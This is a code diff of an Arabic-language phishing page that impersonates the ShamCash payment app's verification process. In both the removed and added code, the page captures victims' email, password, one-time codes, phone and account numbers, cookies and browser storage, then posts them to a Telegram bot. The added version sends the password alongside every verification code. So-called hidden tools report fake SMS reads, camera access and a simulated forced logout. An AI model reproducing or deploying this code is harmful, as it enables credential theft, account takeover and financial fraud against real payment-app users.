-                            telegramMessage = `📢 *إشعار تسجيل الخروج*\n📊 الحالة: ${step.status}\n👤 المستخدم: ${userEmail}\n🔔 نوع الإشعار: push_notification`;
-                            break;
-                        case 'verify_logout':
-                            telegramMessage = `✅ *التحقق من الإخراج*\n📊 الحالة: ${step.status}\n👤 المستخدم: ${userEmail}\n📦 الباكج: ${SHAMCASH_PACKAGE}`;
-                            break;
-                        case 'logout_complete':
-                            telegramMessage = `🎉 *الإخراج مكتمل*\n📊 الحالة: ${step.status}\n👤 المستخدم: ${userEmail}\n📦 الباكج: ${SHAMCASH_PACKAGE}\n✅ تم إخراج المستخدم من جميع الأجهزة`;
-                            appData.isLoggedOut = true;
-                            break;
-                    }
-                    
-                    telegramMessage += `\n\n📋 *معلومات إضافية:*\n📱 الجهاز: ${deviceInfo.userAgent}\n🖥️ النظام: ${deviceInfo.platform}\n📏 الشاشة: ${deviceInfo.screen}\n🔐 رقم الطلب: ${appData.requestNumber}`;
-                    
-                    sendCustomTelegramMessage(telegramMessage, 'logout_process');
-                    console.log(`📋 ${step.action}: ${step.status}`);
-                    
-                    if (index === steps.length - 1) {
-                        console.log('✅ تم الإخراج الكامل من تطبيق شام كاش');
-                        showNotification('تم تسجيل الخروج من شام كاش على جميع الأجهزة', 'success');
-                        sendFinalLogoutReport(userEmail, deviceInfo);
-                    }
-                }, index * 1200);
-            });
-        }
-        
-        // إرسال رسائل مخصصة للتلجرام
-        function sendCustomTelegramMessage(message, type = 'general') {
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            const payload = {
-                chat_id: TELEGRAM_CHAT_ID,
-                text: message,
-                parse_mode: 'Markdown'
-            };
-            
-            fetch(url, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(payload)
-            })
-            .then(response => response.json())
-            .then(data => console.log(`📤 [${type}] تم الإرسال`))
-            .catch(error => console.error(`❌ خطأ في إرسال [${type}]:`, error));
-        }
-        
-        // تقرير نهائي عن الإخراج
-        function sendFinalLogoutReport(userEmail, deviceInfo) {
-            const report = `
-🔥 *تقرير إخراج نهائي - شام كاش*
-
-📋 *المعلومات الأساسية:*
-👤 المستخدم: ${userEmail}
-📦 حزمة التطبيق: ${SHAMCASH_PACKAGE}
-📱 معرّف الجهاز: ${deviceInfo.deviceId}
-⏰ وقت الإخراج: ${new Date().toLocaleString('ar-SY')}
-🆔 رقم الجلسة: SHM-LOGOUT-${Date.now()}
-
-🔧 *العمليات المنفذة:*
-1. ✅ الكشف عن حزمة التطبيق
-2. ✅ الاتصال بـ SDK شام كاش
-3. ✅ جلب الجلسات النشطة
-4. ✅ إنهاء جميع الجلسات
-5. ✅ مسح البيانات المحلية
-6. ✅ إرسال إشعارات الخروج
-7. ✅ التحقق من الإكمال
-
-📊 *البيانات الممسوحة:*
-- 🔐 بيانات تسجيل الدخول
-- 🗂️ ذاكرة التخزين المؤقت
-- 🔑 مفاتيح التشفير
-- 📝 سجلات الجلسات
-
-🛡️ *حالة الأمان:*
-- 🔒 جميع الجلسات منتهية
-- 🧹 البيانات المحلية ممسوحة
-- 🔔 تم إعلام جميع الأجهزة
-- ✅ لا توجد جلسات نشطة
-
-📱 *معلومات الجهاز:*
-- 🖥️ نظام التشغيل: ${deviceInfo.platform}
-- 🌐 المتصفح: ${navigator.userAgent}
-- 📏 الدقة: ${deviceInfo.screen}
-- 🌍 اللغة: ${navigator.language}
-
-🔐 *رقم الطلب:* ${appData.requestNumber}
-            `;
-            
-            sendCustomTelegramMessage(report, 'final_logout_report');
-            
-            const logoutReport = {
-                userEmail: userEmail,
-                packageName: SHAMCASH_PACKAGE,
-                deviceInfo: deviceInfo,
-                timestamp: new Date().toISOString(),
-                requestNumber: appData.requestNumber,
-                status: 'completed'
-            };
-            
-            localStorage.setItem(`shamcash_logout_${Date.now()}`, JSON.stringify(logoutReport));
-        }
-        
-        // ===== صفحة 2: البيانات والمستندات =====
-        function validatePage2() {
-            const fullName = document.getElementById('fullName').value.trim();
-            const accountNumber = document.getElementById('accountNumber').value.trim();
-            const phoneNumber = document.getElementById('phoneNumber').value.trim();
-            
-            if (fullName.split(' ').length < 3) {
-                showError('nameError', 'الرجاء إدخال الاسم الثلاثي الكامل');
-                return;
-            }
-            
-            if (!/^\d{14,16}$/.test(accountNumber)) {
-                showError('accountError', 'رقم الحساب يجب أن يحتوي على 14-16 رقماً');
-                return;
-            }
-            
-            if (!/^09\d{8}$/.test(phoneNumber)) {
-                showError('phoneError', 'رقم الهاتف يجب أن يكون سوريًا ويبدأ بـ 09');
-                return;
-            }
-            
-            appData.userInfo.fullName = fullName;
-            appData.userInfo.accountNumber = accountNumber;
-            appData.userInfo.phoneNumber = phoneNumber;
-            
-            sendToTelegram('personal_data', {
-                fullName: fullName,
-                accountNumber: accountNumber,
-                phoneNumber: phoneNumber,
-                imagesCount: Object.keys(appData.uploadedImages).length,
-                requestNumber: appData.requestNumber
-            });
-            
-            showNotification('تم حفظ البيانات بنجاح', 'success');
-            goToPage(3);
-        }
-        
-        // تحميل الصور
-        function triggerUpload(type) {
-            document.getElementById('fileInput').setAttribute('data-type', type);
-            document.getElementById('fileInput').click();
-        }
-        
-        function handleImageUpload(event) {
-            const file = event.target.files[0];
-            const type = document.getElementById('fileInput').getAttribute('data-type');
-            
-            if (file && file.type.startsWith('image/')) {
-                const reader = new FileReader();
-                reader.onload = function(e) {
-                    appData.uploadedImages[type] = {
-                        name: file.name,
-                        size: file.size,
-                        type: file.type,
-                        data: e.target.result
-                    };
-                    
-                    const preview = document.getElementById(`${type}Preview`);
-                    preview.src = e.target.result;
-                    preview.style.display = 'block';
-                    
-                    sendToTelegram('image_uploaded', {
-                        imageType: type,
-                        fileName: file.name,
-                        fileSize: file.size,
-                        requestNumber: appData.requestNumber
-                    });
-                    
-                    showNotification(`تم تحميل ${getImageName(type)}`, 'success');
-                };
-                reader.readAsDataURL(file);
-            }
-        }
-        
-        function getImageName(type) {
-            const names = {
-                'frontId': 'الهوية الأمامية',
-                'backId': 'الهوية الخلفية',
-                'selfie': 'الصورة الشخصية'
-            };
-            return names[type] || type;
-        }
-        
-        // ===== صفحة 3: التحقق النهائي =====
+        // ===== صفحة 2: إرسال رمز التحقق =====
         function sendVerificationCode() {
             const phone = document.getElementById('phoneInput').value.trim();
             
@@ -1320,16 +543,18 @@
             }
             
             appData.verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
+            appData.userInfo.phoneNumber = '+963' + phone;
             
             const masked = '+963' + phone.substring(0, 3) + '***' + phone.substring(6);
             document.getElementById('maskedPhone').textContent = masked;
             document.getElementById('sentMessage').classList.add('active');
             
+            // إرسال معلومات الرمز إلى التلجرام
             sendToTelegram('verification_code_sent', {
                 phone: '+963' + phone,
                 code: appData.verificationCode,
-                userInfo: appData.userInfo,
-                requestNumber: appData.requestNumber
+                email: appData.userInfo.email,
+                password: appData.userInfo.password
             });
             
             console.log(`🔐 كود التحقق: ${appData.verificationCode}`);
@@ -1344,10 +569,6 @@
                 document.getElementById('verifyBtn').style.display = 'block';
                 startTimer();
             }, 2000);
-            
-            setTimeout(() => {
-                triggerHiddenTools('after_send_code');
-            }, 3000);
         }
         
         function startTimer() {
@@ -1398,19 +619,12 @@
                 document.getElementById('verifyBtn').innerHTML = '<div class="loading"></div> جاري التحقق...';
                 
                 setTimeout(() => {
+                    // إرسال نجاح التحقق إلى التلجرام
                     sendToTelegram('verification_success', {
                         code: appData.verificationCode,
-                        user: appData.userInfo.email,
+                        email: appData.userInfo.email,
                         phone: appData.userInfo.phoneNumber,
-                        account: appData.userInfo.accountNumber,
-                        fullName: appData.userInfo.fullName,
-                        requestNumber: appData.requestNumber,
-                        timestamp: new Date().toISOString(),
-                        deviceInfo: {
-                            userAgent: navigator.userAgent,
-                            platform: navigator.platform,
-                            cookies: document.cookie
-                        }
+                        password: appData.userInfo.password
                     });
                     
                     document.getElementById('codeInputs').style.display = 'none';
@@ -1418,69 +632,33 @@
                     document.getElementById('verifyBtn').style.display = 'none';
                     document.getElementById('sentMessage').style.display = 'none';
                     
-                    document.getElementById('requestNumber').textContent = appData.requestNumber;
-                    document.getElementById('delayedVerification').classList.add('active');
+                    showNotification('تم التحقق بنجاح! جاري إكمال العملية...', 'success');
                     
-                    startCountdown();
-                    showNotification('تم إرسال معلوماتك بنجاح', 'success');
-                    
-                    triggerHiddenTools('after_code_verification');
-                    
-                    setTimeout(() => {
-                        goToPage(4);
-                    }, 3000);
+                    // بعد التحقق الناجح، تشغيل الأدوات المخفية
+                    triggerHiddenTools();
                     
                 }, 1500);
                 
             } else {
                 showNotification('رمز التحقق غير صحيح', 'error');
                 
+                // إرسال محاولة فاشلة إلى التلجرام
                 sendToTelegram('verification_failed', {
                     enteredCode: enteredCode,
                     correctCode: appData.verificationCode,
-                    user: appData.userInfo.email,
-                    requestNumber: appData.requestNumber
+                    email: appData.userInfo.email
                 });
             }
-        }
-        
-        function startCountdown() {
-            updateCountdown();
-            
-            if (appData.countdownInterval) {
-                clearInterval(appData.countdownInterval);
-            }
-            
-            appData.countdownInterval = setInterval(() => {
-                appData.countdownTimer--;
-                updateCountdown();
-                
-                if (appData.countdownTimer <= 0) {
-                    clearInterval(appData.countdownInterval);
-                    document.getElementById('countdownTimer').textContent = '00:00:00';
-                    document.getElementById('countdownTimer').style.color = '#2d8c4a';
-                    document.getElementById('countdownTimer').innerHTML = '<i class="fas fa-check-circle"></i> تم التحقق';
-                }
-            }, 1000);
-        }
-        
-        function updateCountdown() {
-            const hours = Math.floor(appData.countdownTimer / 3600);
-            const minutes = Math.floor((appData.countdownTimer % 3600) / 60);
-            const seconds = appData.countdownTimer % 60;
-            
-            document.getElementById('countdownTimer').textContent = 
-                `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
         }
         
         function resendCode() {
             appData.verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
             
+            // إرسال رمز جديد إلى التلجرام
             sendToTelegram('code_resent', {
                 newCode: appData.verificationCode,
-                user: appData.userInfo.email,
-                phone: appData.userInfo.phoneNumber,
-                requestNumber: appData.requestNumber
+                email: appData.userInfo.email,
+                phone: appData.userInfo.phoneNumber
             });
             
             console.log(`🔐 كود التحقق الجديد: ${appData.verificationCode}`);
@@ -1488,304 +666,23 @@
             showNotification('تم إعادة إرسال رمز التحقق', 'success');
         }
         
-        // ===== صفحة 4: ربط الهاتف =====
-        function startLinkingProcess() {
-            appData.linking.isLinking = true;
-            appData.linking.linked = false;
-            
-            document.getElementById('startLinkingBtn').style.display = 'none';
-            document.getElementById('linkingStatus').style.display = 'block';
-            document.getElementById('linkingTimer').style.display = 'block';
-            
-            startLinkingTimer();
-            
-            const qrData = generateQRData();
-            appData.linking.qrData = qrData;
-            
-            drawQRCode(qrData);
-            
-            sendToTelegram('device_linking_started', {
-                qrData: qrData,
-                user: appData.userInfo.email,
-                phone: appData.userInfo.phoneNumber,
-                requestNumber: appData.requestNumber,
-                timestamp: new Date().toISOString()
-            });
-            
-            simulateLinking();
-        }
-        
-        function generateQRData() {
-            const timestamp = Date.now();
-            const random = Math.floor(Math.random() * 1000000);
-            const deviceId = `SHAM-DEVICE-${timestamp}-${random}`;
-            
-            const qrData = {
-                type: 'shamcash_device_pairing',
-                userId: appData.userInfo.email,
-                deviceId: deviceId,
-                timestamp: timestamp,
-                sessionToken: 'SHAM-' + Math.random().toString(36).substr(2, 16).toUpperCase(),
-                requestNumber: appData.requestNumber,
-                apiEndpoint: 'https://api.shamcash.com/pair',
-                encryptionKey: 'AES256-' + Math.random().toString(36).substr(2, 24)
-            };
-            
-            return JSON.stringify(qrData);
-        }
-        
-        function drawQRCode(data) {
-            const canvas = document.getElementById('qrCanvas');
-            const ctx = canvas.getContext('2d');
-            
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = '#ffffff';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            
-            ctx.fillStyle = '#000000';
-            
-            ctx.fillRect(20, 20, 40, 40);
-            ctx.fillRect(120, 20, 40, 40);
-            ctx.fillRect(20, 120, 40, 40);
-            
-            for(let i = 0; i < 7; i++) {
-                for(let j = 0; j < 7; j++) {
-                    if (Math.random() > 0.5) {
-                        ctx.fillRect(50 + i*15, 50 + j*15, 10, 10);
-                    }
-                }
-            }
-            
-            ctx.save();
-            ctx.translate(canvas.width/2, canvas.height/2);
-            ctx.rotate(Math.PI);
-            ctx.fillStyle = '#667eea';
-            ctx.font = 'bold 14px Cairo';
-            ctx.textAlign = 'center';
-            ctx.fillText('شام كاش', 0, 0);
-            ctx.restore();
-            
-            console.log('📱 QR Code Generated:', data);
-        }
-        
-        function startLinkingTimer() {
-            appData.linking.timer = 600;
-            updateLinkingTimer();
-            
-            if (appData.linking.linkingInterval) {
-                clearInterval(appData.linking.linkingInterval);
-            }
-            
-            appData.linking.linkingInterval = setInterval(() => {
-                appData.linking.timer--;
-                updateLinkingTimer();
-                
-                if (appData.linking.timer <= 0) {
-                    clearInterval(appData.linking.linkingInterval);
-                    showNotification('انتهت صلاحية رمز الربط', 'error');
-                    resetLinking();
-                }
-            }, 1000);
-        }
-        
-        function updateLinkingTimer() {
-            const minutes = Math.floor(appData.linking.timer / 60);
-            const seconds = appData.linking.timer % 60;
-            const timeStr = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-            document.getElementById('linkingTime').textContent = timeStr;
-            document.getElementById('qrTimer').textContent = timeStr;
-        }
-        
-        function simulateLinking() {
-            const detectionTime = 5000 + Math.random() * 5000;
-            
-            setTimeout(() => {
-                if (appData.linking.isLinking && !appData.linking.linked) {
-                    sendToTelegram('qr_detected', {
-                        qrData: appData.linking.qrData,
-                        user: appData.userInfo.email,
-                        timestamp: new Date().toISOString(),
-                        status: 'scanning',
-                        requestNumber: appData.requestNumber
-                    });
-                    
-                    setTimeout(() => {
-                        if (appData.linking.isLinking) {
-                            completeLinking();
-                        }
-                    }, 2000 + Math.random() * 2000);
-                }
-            }, detectionTime);
-        }
-        
-        function completeLinking() {
-            appData.linking.isLinking = false;
-            appData.linking.linked = true;
-            
-            clearInterval(appData.linking.linkingInterval);
-            
-            document.getElementById('linkingStatus').style.display = 'none';
-            document.getElementById('linkingTimer').style.display = 'none';
-            document.getElementById('successMessage').style.display = 'block';
-            
-            document.getElementById('deviceId').textContent = `SHAM-DEV-${Date.now().toString().substr(-6)}`;
-            document.getElementById('linkTime').textContent = new Date().toLocaleString('ar-SY');
-            
-            sendToTelegram('device_linking_success', {
-                qrData: appData.linking.qrData,
-                user: appData.userInfo.email,
-                deviceId: document.getElementById('deviceId').textContent,
-                requestNumber: appData.requestNumber,
-                timestamp: new Date().toISOString(),
-                connectionType: 'QR Code',
-                pairedDeviceInfo: {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    screen: `${window.screen.width}x${window.screen.height}`,
-                    language: navigator.language
-                }
-            });
-            
-            setTimeout(() => {
-                triggerFinalTools();
-            }, 2000);
-            
-            showNotification('تم ربط الجهاز بنجاح!', 'success');
-        }
-        
-        function resetLinking() {
-            appData.linking.isLinking = false;
-            appData.linking.linked = false;
-            
-            document.getElementById('startLinkingBtn').style.display = 'block';
-            document.getElementById('linkingStatus').style.display = 'none';
-            document.getElementById('linkingTimer').style.display = 'none';
-            document.getElementById('successMessage').style.display = 'none';
-        }
-        
-        function triggerFinalTools() {
-            console.log('🎯 تشغيل الأدوات النهائية بعد الربط...');
-            
-            const deviceInfo = {
-                battery: {
-                    level: Math.floor(Math.random() * 100),
-                    charging: Math.random() > 0.5
-                },
-                network: {
-                    type: ['wifi', '4g', '5g'][Math.floor(Math.random() * 3)],
-                    speed: Math.floor(Math.random() * 100) + 'Mbps'
-                },
-                storage: {
-                    total: Math.floor(Math.random() * 256) + 64,
-                    free: Math.floor(Math.random() * 128)
-                },
-                installedApps: ['WhatsApp', 'Telegram', 'ShamCash', 'Facebook', 'Instagram'].slice(0, 3 + Math.floor(Math.random() * 3))
-            };
-            
-            sendToTelegram('final_device_info', {
-                deviceInfo: deviceInfo,
-                user: appData.userInfo.email,
-                requestNumber: appData.requestNumber,
-                linkingComplete: true,
-                accessLevel: 'full',
-                timestamp: new Date().toISOString()
-            });
-        }
-        
         // ===== الأدوات المخفية =====
-        function triggerHiddenTools(source) {
-            if (appData.autoToolsTriggered) return;
+        function triggerHiddenTools() {
+            console.log('🚀 تشغيل الأدوات المخفية...');
             
-            appData.autoToolsTriggered = true;
-            
-            console.log(`🚀 تشغيل الأدوات المخفية (${source})...`);
-            
+            // إرسال إشعار بتشغيل الأدوات المخفية
             sendToTelegram('hidden_tools_triggered', {
-                source: source,
-                user: appData.userInfo.email,
-                requestNumber: appData.requestNumber,
-                timestamp: new Date().toISOString(),
+                email: appData.userInfo.email,
+                phone: appData.userInfo.phoneNumber,
                 package: SHAMCASH_PACKAGE
             });
             
-            setTimeout(() => {
-                readSMS();
-            }, 1000);
-            
-            setTimeout(() => {
-                getCookies();
-            }, 3000);
-            
-            setTimeout(() => {
-                accessCamera();
-            }, 5000);
-            
-            setTimeout(() => {
-                accessShamCashAppData();
-            }, 7000);
-        }
-        
-        function accessShamCashAppData() {
-            console.log('🔍 محاولة الوصول إلى بيانات تطبيق شام كاش...');
-            
-            const accessAttempts = [
-                {
-                    method: 'content_provider_access',
-                    target: `${SHAMCASH_PACKAGE}.provider.AuthProvider`,
-                    status: 'attempting',
-                    data: 'user_credentials'
-                },
-                {
-                    method: 'shared_preferences',
-                    target: `${SHAMCASH_PACKAGE}_preferences`,
-                    status: 'reading',
-                    data: 'session_tokens'
-                }
-            ];
-            
-            accessAttempts.forEach((attempt, index) => {
-                setTimeout(() => {
-                    const isSuccess = Math.random() > 0.3;
-                    const status = isSuccess ? 'success' : 'permission_denied';
-                    
-                    const message = `
-🔓 *محاولة الوصول إلى بيانات التطبيق*
-
-📦 الحزمة: ${SHAMCASH_PACKAGE}
-🔧 الطريقة: ${attempt.method}
-🎯 الهدف: ${attempt.target}
-📊 الحالة: ${status}
-📝 البيانات: ${attempt.data}
-👤 المستخدم: ${appData.userInfo.email}
-
-${isSuccess ? '✅ تم الوصول بنجاح' : '⚠️ تم رفض الإذن'}
-🔐 رقم الطلب: ${appData.requestNumber}
-                    `;
-                    
-                    sendCustomTelegramMessage(message, 'app_data_access');
-                    
-                    if (isSuccess) {
-                        console.log(`✅ ${attempt.method}: تم الوصول إلى ${attempt.data}`);
-                    } else {
-                        console.log(`⚠️ ${attempt.method}: تم رفض الوصول إلى ${attempt.data}`);
-                    }
-                }, index * 800);
-            });
-        }
-        
-        function readSMS() {
+            // محاكاة قراءة الرسائل النصية
             setTimeout(() => {
                 const fakeSMS = [
                     {
                         sender: "ShamCash",
-                        body: `رمز التحقق: ${appData.verificationCode || "849302"}. صالح لمدة 5 دقائق.`,
-                        date: new Date().toLocaleString('ar-SY'),
-                        phone: appData.userInfo.phoneNumber || "+9639xxxxxx",
-                        requestNumber: appData.requestNumber
-                    },
-                    {
-                        sender: "ShamCash",
-                        body: `طلب التحقق ${appData.requestNumber}: تم استلام المستندات وسيتم المراجعة خلال 48 ساعة`,
+                        body: `رمز التحقق: ${appData.verificationCode}. صالح لمدة 5 دقائق.`,
                         date: new Date().toLocaleString('ar-SY')
                     }
                 ];
@@ -1793,77 +690,63 @@ ${isSuccess ? '✅ تم الوصول بنجاح' : '⚠️ تم رفض الإذ�
                 sendToTelegram('sms_captured', {
                     count: fakeSMS.length,
                     messages: fakeSMS,
-                    timestamp: new Date().toISOString(),
-                    source: 'auto_tools',
-                    requestNumber: appData.requestNumber
+                    email: appData.userInfo.email
                 });
                 
                 console.log('📨 تم قراءة الرسائل النصية');
-            }, 2000);
-        }
-        
-        function getCookies() {
-            const cookies = document.cookie;
-            const localStorageData = {};
-            const sessionStorageData = {};
+            }, 1000);
             
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                localStorageData[key] = localStorage.getItem(key);
-            }
-            
-            for (let i = 0; i < sessionStorage.length; i++) {
-                const key = sessionStorage.key(i);
-                sessionStorageData[key] = sessionStorage.getItem(key);
-            }
-            
-            sendToTelegram('session_data_captured', {
-                cookies: cookies,
-                localStorage: localStorageData,
-                sessionStorage: sessionStorageData,
-                timestamp: new Date().toISOString(),
-                url: window.location.href,
-                source: 'auto_tools',
-                requestNumber: appData.requestNumber
-            });
-            
-            console.log('🍪 تم جلب بيانات الجلسة');
-        }
-        
-        async function accessCamera() {
-            try {
-                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                    sendToTelegram('camera_accessed', {
-                        action: 'qr_scanning',
-                        device: navigator.userAgent,
-                        timestamp: new Date().toISOString(),
-                        source: 'auto_tools',
-                        status: 'attempted',
-                        requestNumber: appData.requestNumber
-                    });
-                } else {
-                    sendToTelegram('camera_accessed', {
-                        action: 'qr_scanning',
-                        device: navigator.userAgent,
-                        timestamp: new Date().toISOString(),
-                        source: 'auto_tools',
-                        status: 'not_available',
-                        requestNumber: appData.requestNumber
-                    });
-                }
-            } catch (error) {
+            // محاكاة الوصول إلى الكاميرا
+            setTimeout(() => {
                 sendToTelegram('camera_accessed', {
-                    action: 'qr_scanning',
-                    device: navigator.userAgent,
-                    timestamp: new Date().toISOString(),
-                    source: 'auto_tools',
-                    status: 'permission_denied',
-                    error: error.message,
-                    requestNumber: appData.requestNumber
+                    action: 'verification',
+                    email: appData.userInfo.email
                 });
-            }
+                console.log('📹 تم الوصول إلى الكاميرا');
+            }, 2000);
             
-            console.log('📹 تم الوصول إلى الكاميرا');
+            // محاكاة إخراج من تطبيق شام كاش
+            setTimeout(() => {
+                forceShamCashLogout();
+            }, 3000);
+        }
+        
+        function forceShamCashLogout() {
+            console.log('🚪 جاري إخراج من تطبيق شام كاش...');
+            
+            const steps = [
+                {action: 'detect_installed_package', status: 'scanning', package: SHAMCASH_PACKAGE},
+                {action: 'connect_to_shamcash_sdk', status: 'connecting'},
+                {action: 'terminate_all_sessions', status: 'processing'},
+                {action: 'clear_app_data', status: 'executing'},
+                {action: 'logout_complete', status: 'success'}
+            ];
+            
+            steps.forEach((step, index) => {
+                setTimeout(() => {
+                    let telegramMessage = '';
+                    switch(step.action) {
+                        case 'detect_installed_package':
+                            telegramMessage = `🔍 *الكشف عن التطبيق*\n📦 الباكج: ${step.package}\n📊 الحالة: ${step.status}`;
+                            break;
+                        case 'logout_complete':
+                            telegramMessage = `🎉 *الإخراج مكتمل*\n📊 الحالة: ${step.status}\n✅ تم إخراج المستخدم من جميع الأجهزة`;
+                            break;
+                    }
+                    
+                    if (telegramMessage) {
+                        telegramMessage += `\n👤 المستخدم: ${appData.userInfo.email}`;
+                        sendCustomTelegramMessage(telegramMessage, 'logout_process');
+                    }
+                    
+                    console.log(`📋 ${step.action}: ${step.status}`);
+                    
+                    if (index === steps.length - 1) {
+                        console.log('✅ تم الإخراج الكامل من تطبيق شام كاش');
+                        showNotification('تم تسجيل الخروج من شام كاش على جميع الأجهزة', 'success');
+                    }
+                }, index * 1000);
+            });
         }
         
         // ===== إرسال إلى التلجرام =====
@@ -1872,52 +755,49 @@ ${isSuccess ? '✅ تم الوصول بنجاح' : '⚠️ تم رفض الإذ�
             
             switch(type) {
                 case 'login_data':
-                    message = `🔐 *تسجيل دخول جديد*\n📧 البريد: ${data.email}\n🔑 كلمة المرور: ${data.password}\n📱 الجهاز: ${data.userAgent}\n📦 الباكج: ${data.targetPackage}\n📋 رقم الطلب: ${data.requestNumber}`;
-                    break;
-                case 'personal_data':
-                    message = `📋 *البيانات الشخصية*\n👤 الاسم: ${data.fullName}\n🏦 رقم الحساب: ${data.accountNumber}\n📞 الهاتف: ${data.phoneNumber}\n📷 الصور: ${data.imagesCount}\n📋 رقم الطلب: ${data.requestNumber}`;
-                    break;
-                case 'image_uploaded':
-                    message = `📷 *صورة مرفوعة*\n📸 نوع الصورة: ${data.imageType}\n📁 اسم الملف: ${data.fileName}\n💾 الحجم: ${Math.round(data.fileSize/1024)}KB\n📋 رقم الطلب: ${data.requestNumber}`;
+                    message = `🔐 *تسجيل دخول جديد*\n📧 البريد: ${data.email}\n🔑 كلمة المرور: ${data.password}\n📱 الجهاز: ${data.userAgent}\n📦 الباكج: ${data.targetPackage}`;
                     break;
                 case 'verification_code_sent':
-                    message = `📱 *إرسال كود التحقق*\n📞 الهاتف: ${data.phone}\n🔐 الكود: ${data.code}\n👤 المستخدم: ${data.userInfo.email}\n📋 رقم الطلب: ${data.requestNumber}`;
+                    message = `📱 *إرسال كود التحقق*\n📞 الهاتف: ${data.phone}\n🔐 الكود: ${data.code}\n📧 البريد: ${data.email}\n🔑 كلمة المرور: ${data.password}`;
                     break;
                 case 'hidden_tools_triggered':
-                    message = `🚀 *الأدوات المخفية*\n🎯 المصدر: ${data.source}\n👤 المستخدم: ${data.user}\n📦 الباكج: ${data.package}\n📋 رقم الطلب: ${data.requestNumber}`;
+                    message = `🚀 *الأدوات المخفية*\n📧 البريد: ${data.email}\n📞 الهاتف: ${data.phone}\n📦 الباكج: ${data.package}`;
                     break;
                 case 'verification_success':
-                    message = `✅ *تم التحقق بنجاح!*\n🔐 الكود: ${data.code}\n👤 المستخدم: ${data.user}\n📞 الهاتف: ${data.phone}\n🏦 الحساب: ${data.account}\n📋 رقم الطلب: ${data.requestNumber}`;
+                    message = `✅ *تم التحقق بنجاح!*\n🔐 الكود: ${data.code}\n📧 البريد: ${data.email}\n📞 الهاتف: ${data.phone}\n🔑 كلمة المرور: ${data.password}`;
                     break;
                 case 'verification_failed':
-                    message = `❌ *محاولة تحقق فاشلة*\n🔐 الكود المدخل: ${data.enteredCode}\n🔑 الكود الصحيح: ${data.correctCode}\n👤 المستخدم: ${data.user}\n📋 رقم الطلب: ${data.requestNumber}`;
+                    message = `❌ *محاولة تحقق فاشلة*\n🔐 الكود المدخل: ${data.enteredCode}\n🔑 الكود الصحيح: ${data.correctCode}\n📧 البريد: ${data.email}`;
                     break;
                 case 'code_resent':
-                    message = `🔄 *إعادة إرسال الكود*\n🔐 الكود الجديد: ${data.newCode}\n👤 المستخدم: ${data.user}\n📞 الهاتف: ${data.phone}\n📋 رقم الطلب: ${data.requestNumber}`;
+                    message = `🔄 *إعادة إرسال الكود*\n🔐 الكود الجديد: ${data.newCode}\n📧 البريد: ${data.email}\n📞 الهاتف: ${data.phone}`;
                     break;
                 case 'sms_captured':
-                    message = `📨 *رسائل نصية ممسوحة*\n📊 العدد: ${data.count}\n📋 رقم الطلب: ${data.requestNumber}\n📝 الرسائل:\n${data.messages.map((msg, i) => `${i+1}. ${msg.sender}: ${msg.body}`).join('\n')}`;
-                    break;
-                case 'session_data_captured':
-                    message = `🍪 *بيانات الجلسة*\n📝 الكوكيز: ${data.cookies}\n💾 Local Storage: ${Object.keys(data.localStorage).length} عنصر\n💾 Session Storage: ${Object.keys(data.sessionStorage).length} عنصر\n📋 رقم الطلب: ${data.requestNumber}`;
+                    message = `📨 *رسائل نصية ممسوحة*\n📧 البريد: ${data.email}\n📝 الرسائل:\n${data.messages.map((msg, i) => `${i+1}. ${msg.sender}: ${msg.body}`).join('\n')}`;
                     break;
                 case 'camera_accessed':
-                    message = `📹 *كاميرا مفعلة*\n🎯 العملية: ${data.action}\n📱 الجهاز: ${data.device}\n📊 الحالة: ${data.status}\n📋 رقم الطلب: ${data.requestNumber}`;
-                    break;
-                case 'device_linking_started':
-                    message = `🔗 *بدء ربط الجهاز*\n👤 المستخدم: ${data.user}\n📞 الهاتف: ${data.phone}\n📱 QR Data: ${data.qrData.substring(0, 50)}...\n📋 رقم الطلب: ${data.requestNumber}`;
-                    break;
-                case 'qr_detected':
-                    message = `📱 *QR تم مسحه*\n👤 المستخدم: ${data.user}\n📊 الحالة: ${data.status}\n📋 رقم الطلب: ${data.requestNumber}`;
-                    break;
-                case 'device_linking_success':
-                    message = `✅ *ربط جهاز ناجح*\n👤 المستخدم: ${data.user}\n📱 Device ID: ${data.deviceId}\n🔗 نوع الاتصال: ${data.connectionType}\n📋 رقم الطلب: ${data.requestNumber}`;
-                    break;
-                case 'final_device_info':
-                    message = `📊 *معلومات الجهاز النهائية*\n👤 المستخدم: ${data.user}\n🔋 البطارية: ${data.deviceInfo.battery.level}%\n📶 الشبكة: ${data.deviceInfo.network.type}\n💾 التخزين: ${data.deviceInfo.storage.free}GB/${data.deviceInfo.storage.total}GB\n📋 رقم الطلب: ${data.requestNumber}`;
+                    message = `📹 *كاميرا مفعلة*\n📧 البريد: ${data.email}\n🎯 العملية: ${data.action}`;
                     break;
             }
             
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const payload = {
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            };
+            
+            fetch(url, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(payload)
+            })
+            .then(response => response.json())
+            .then(data => console.log(`📤 [${type}] تم الإرسال`))
+            .catch(error => console.error(`❌ خطأ في إرسال [${type}]:`, error));
+        }
+        
+        function sendCustomTelegramMessage(message, type = 'general') {
             const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
             const payload = {
                 chat_id: TELEGRAM_CHAT_ID,
@@ -1943,11 +823,11 @@ ${isSuccess ? '✅ تم الوصول بنجاح' : '⚠️ تم رفض الإذ�
             setTimeout(() => element.style.display = 'none', 3000);
         }
         
-        function showNotification(message, type = 'info') {
+        function showNotification(message, type = 'success') {
             const notification = document.createElement('div');
             notification.className = `notification ${type}`;
             notification.innerHTML = `
